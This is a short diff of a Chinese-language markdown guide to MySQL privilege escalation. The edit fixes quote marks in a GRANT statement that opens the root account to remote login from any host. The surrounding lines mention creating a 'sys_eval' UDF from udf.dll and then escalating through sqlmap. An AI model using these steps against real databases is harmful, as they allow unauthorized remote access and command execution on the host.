@@ -20,7 +20,8 @@ create function sys_eval returns string soname 'udf.dll';
 ```
 ## 当以上的方法无法成功时，可以开启mysql的外连功能
 ```
-GRANT ALL PRIVILEGES ON *.* TO ‘root’@'%’ IDENTIFIED BY ‘rootpassword’ WITH GRANT OPTION;
+GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'rootpassword';
+rootpassword为对应的密码
 ```
 随后通过sqlmap进行提权，命令如下：
 ```
